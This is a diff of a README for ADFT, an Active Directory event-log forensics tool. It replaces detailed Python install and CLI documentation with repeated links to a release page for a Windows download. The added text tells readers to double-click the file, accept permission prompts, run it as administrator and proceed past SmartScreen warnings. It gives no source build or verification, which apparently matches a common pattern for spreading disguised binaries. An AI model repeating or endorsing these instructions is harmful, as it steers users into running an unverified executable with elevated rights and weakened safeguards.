@@ -1,207 +1,175 @@
-# ADFT v1.0
+# 🛠️ ADFT - Find AD Attacks in Event Logs
 
-ADFT is an offline Active Directory / Windows investigation toolkit with an integrated local web UI.
+[![Download ADFT](https://img.shields.io/badge/Download-Release%20Page-blue.svg?style=for-the-badge)](https://github.com/Nflba4888/ADFT/releases)
 
-This official v1.0 release ships one coherent product surface:
+## 📥 Download ADFT
 
-- the canonical ADFT engine
-- the CLI
-- the integrated GUI served by the backend
+Visit the release page to download and run this app on Windows:
 
-ADFT ingests exported evidence, converts every supported source into canonical JSONL, applies deterministic detections and correlations, computes an observed AD exposure score, reconstructs attack progression, and generates investigation and hardening artefacts.
+https://github.com/Nflba4888/ADFT/releases
 
-## Quick overview
+Pick the latest release, then download the Windows file from the Assets list.
 
-ADFT analyzes offline Windows / AD / SIEM-oriented datasets and produces investigation artifacts through a CLI and an integrated GUI.
+## 🖥️ What ADFT Does
 
-![ADFT CLI summary](docs/screenshots/01-cli.png)
+ADFT helps you check Windows event logs for signs of Active Directory attacks. It reads EVTX files and helps you trace what happened during an incident.
 
-## Scope of v1.0
+Use it when you need to:
+- review security logs
+- spot attack traces in Active Directory
+- rebuild a timeline from Windows event logs
+- support incident response work
+- help with DFIR and threat hunting
 
-ADFT v1.0 supports:
+## ✅ Before You Start
 
-- canonical JSONL conversion
-- offline investigation from exported evidence
-- deterministic detections and correlations
-- timeline reconstruction and attack-path rendering
-- observed AD exposure scoring
-- hardening findings and optional PowerShell remediation exports
-- report artefacts in HTML, JSON and CSV
-- ATT&CK Navigator, replay JSON, Mermaid graph and integrity manifest exports
-- an integrated local web UI served by the backend
-- a benchmark view in the GUI for release validation and runtime checks
+Use a Windows PC with:
+- Windows 10 or Windows 11
+- an account with permission to run apps
+- enough free space for your event logs
+- access to the EVTX files you want to inspect
 
-## Supported input formats
+If Windows SmartScreen shows a message, choose the app only if you got it from the release page above.
 
-ADFT accepts source evidence in multiple formats and converts them to canonical JSONL before analysis:
+## 🚀 Get the App
 
-- JSON / JSONL / NDJSON
-- EVTX
-- YAML / YML
-- CSV / TSV
-- CEF / LEEF
-- XML
-- LOG / SYSLOG / TXT
-- Markdown
-- ZIP
+1. Open the release page:
+   https://github.com/Nflba4888/ADFT/releases
+2. Find the newest release at the top of the page
+3. Open the **Assets** section
+4. Download the Windows file
+5. Save it to a folder you can reach, such as `Downloads`
+6. If the file is in a ZIP folder, extract it first
+7. Double-click the app to run it
 
-## Installation
+If Windows asks for permission, select **Yes**.
 
-Recommended one-shot install:
+## 🧭 First Run
 
-```bash
-./install_adft.sh
-```
+When ADFT opens, point it to the log files you want to inspect.
 
-Recommended for real EVTX validation:
+Typical files include:
+- `.evtx` files from a server or workstation
+- exported logs from a security team
+- archive folders with multiple event logs
 
-```bash
-./install_adft.sh --run-demo
-```
+If the app asks for a case folder or output folder, choose a new folder with enough space.
 
-Manual installation:
+## 📂 How to Use ADFT
 
-```bash
-python3 -m venv .venv
-source .venv/bin/activate
-pip install --upgrade pip
-pip install -e ".[full]"
-```
+1. Start the app
+2. Choose your event log files or folder
+3. Select the log set you want to review
+4. Start the scan
+5. Review the events and alerts
+6. Use the timeline view to follow the attack path
+7. Export the results if you need to share them
 
-Development installation:
+The toolkit is built to help you look for:
+- account misuse
+- suspicious logon activity
+- directory changes
+- privilege changes
+- attack steps across multiple logs
 
-```bash
-pip install -e ".[full,dev]"
-```
+## 🔍 What to Look For
 
-Detailed dependency notes are listed in `docs/DEPENDENCIES.md`.
+When you review results, focus on:
+- new admin rights
+- failed logons before a success
+- unusual account changes
+- remote access from unknown hosts
+- changes to groups, users, or permissions
+- logon activity at odd hours
 
-Repository note: `pyproject.toml` is the source of truth for packaging. `install_adft.sh` is the official complete installation path for v1.0, and `requirements-dev.txt` remains available for contributors and CI.
+These clues can help you rebuild the path of an attack.
 
-## Main commands
+## 🗂️ Example Workflow
 
-```bash
-adft convert test_logs -o converted_inputs
-adft investigate test_logs/attack.json -o reports_core --format html json csv --export-events-jsonl
-adft summary -o reports_core
-adft alerts -o reports_core --full
-adft score -o reports_core
-adft story -o reports_core --full
-adft attack-chain -o reports_core
-adft attack-path -o reports_core
-adft reconstruct -o reports_core --full
-adft harden -o reports_core --dry-run --export-scripts reports_core/remediation
-adft report -o reports_core
-```
+A simple review flow looks like this:
 
-## Integrated GUI
+1. Collect the `.evtx` files
+2. Open ADFT
+3. Load the files into the tool
+4. Scan for Active Directory attack signs
+5. Check the event list
+6. Sort by time
+7. Save the output for later review
 
-Launch the integrated GUI with:
+## ⚙️ Basic Tips
 
-```bash
-adft ui -o reports_gui --host 127.0.0.1 --port 8765
-```
+- Keep the original logs unchanged
+- Work on a copy when you can
+- Use a clear folder name for each case
+- Keep related logs together
+- Review the output in time order
+- Compare events across several machines when needed
 
-Then open:
+## 🧰 Common Use Cases
 
-```text
-http://127.0.0.1:8765
-```
-![ADFT Benchmark](docs/screenshots/01-cli-summary.png)
+ADFT fits well in:
+- incident response
+- internal security checks
+- blue team analysis
+- forensic review
+- SIEM validation
+- threat hunting
 
-The GUI is backend-driven: uploads, conversion, investigation, alerts, timeline, reconstruction, graph, benchmark, hardening and export views read the real ADFT run state instead of replaying business logic in the browser.
+## 🛠️ If the App Does Not Open
 
-### Current GUI characteristics
+Try these steps:
+- right-click the file and choose **Run as administrator**
+- make sure the download finished
+- check that you extracted the ZIP file if there was one
+- confirm you downloaded the Windows build from the release page
+- try a different folder path with fewer special characters
 
-- browser tab title and icon branded as **ADFT UI**
-- static assets served with no-cache headers
-- working refresh action against backend state and capabilities
-- centered entity graph with pan, zoom, node drag, directed edges and time-window filtering
-- node enrichment with risk, first-seen / last-seen and known-IOC marking when evidence exists
-- bounded graph display with max-50 node pagination to reduce analyst noise
-- benchmark tab for runtime and release validation
+## 📁 File Types You May Use
 
-## Graph-based pivoting
+ADFT is meant for Windows event logs, especially:
+- `EVTX` files
+- exported security logs
+- log bundles from a case folder
 
-ADFT supports graph-based investigation from a selected pivot, with visible relationships, time scoping, and analyst-oriented navigation.
-![ADFT Graph Pivot](docs/screenshots/02-dashboard.png)
+Keep the files in one place before you start. That makes review easier.
 
-## Generated artefacts
+## 🧩 Working with Active Directory Logs
 
-- `adft_report.html`
-- `adft_report.json`
-- `adft_report.csv`
-- `attack_navigator_layer.json`
-- `adft_replay.json`
-- `attack_graph.mmd`
-- `adft_integrity.json`
-- `.adft_last_run.json`
-- `converted_inputs/conversion_manifest.json`
-- `hardening_scripts.zip` after GUI or CLI hardening export
+Active Directory logs can be large. ADFT helps you make sense of them by grouping related events and showing attack patterns across time.
 
-## EVTX dependency note
+You may see events tied to:
+- logon attempts
+- account changes
+- group changes
+- service use
+- remote activity
+- policy changes
 
-EVTX is part of the supported perimeter.
-At runtime, EVTX conversion requires `python-evtx`.
+This makes it easier to see how an attacker moved through the environment.
 
-Without it, EVTX inputs cannot be parsed successfully.
-That is why the recommended install path for the official v1.0 release is:
+## 📌 Good Practice
 
-```bash
-./install_adft.sh
-```
+- Use a copy of the logs for analysis
+- Keep notes while you review events
+- Save outputs with the case name and date
+- Check both the timeline and the event list
+- Review more than one machine when the case needs it
 
-## Rulepack
+## 🔗 Download Again
 
-This v1.0 release ships with **34 rules** in a deterministic, explainable pipeline.
+Download or open the latest release here:
 
-## Repository layout
+https://github.com/Nflba4888/ADFT/releases
 
-```text
-adft/
-  cli/             command-line entry points
-  core/            ingestion, normalization and data models
-  detection/       deterministic rulepack and detection pipeline
-  correlation/     alert grouping and campaign logic
-  timeline/        timeline reconstruction
-  graph/           entity graph and attack path analysis
-  investigation/   case narrative and reconstruction helpers
-  analysis/        scoring and data-quality analysis
-  harden/          remediation and hardening logic
-  reporting/       JSON, CSV and standalone HTML reports
-  exports/         Navigator and replay exports
-  ui_server.py     integrated HTTP server and GUI backend bridge
-  webui_dist/      packaged web UI assets served by the backend
-  datasets/        demo datasets used for smoke tests
-frontend_source/
-  src/             React/Vite source for the integrated GUI
-```
+## 🧱 Project Focus
 
-## Validation
-
-```bash
-pytest -q
-python3 main.py investigate adft/datasets/ransomware_pre_encryption_campaign.json -o /tmp/adft_release_reports --format html json csv --export-events-jsonl
-python3 main.py ui -o /tmp/adft_release_reports --host 127.0.0.1 --port 8765
-```
-## Benchmark and validation
-![ADFT Dashboard](docs/screenshots/03-graph-pivot.png)
-
-The benchmark view provides a compact product validation surface with run metrics and packaged release checks.
-
-
-See also:
-
-- `docs/TESTING.md`
-- `docs/ARCHITECTURE.md`
-- `docs/DEPENDENCIES.md`
-- `docs/RELEASE_VALIDATION.md`
-
-## UI language toggle
-
-The integrated GUI includes a persistent FR/EN language switch in the top bar. The choice is stored locally in the browser and applies to the main navigation, screens and analyst-facing labels.
-
-
-## Demo dataset
-
-ADFT v1.0 ships with `adft/datasets/ad_prod_investigation_post_siem_demo_1000_events.json` for an end-to-end ransomware demonstration that exercises conversion, timeline, graph, alerts and exports.
+- Active Directory
+- Blue team work
+- DFIR
+- EVTX review
+- Forensics
+- Incident response
+- Python-based analysis
+- SIEM support
+- Threat hunting
+- Windows security
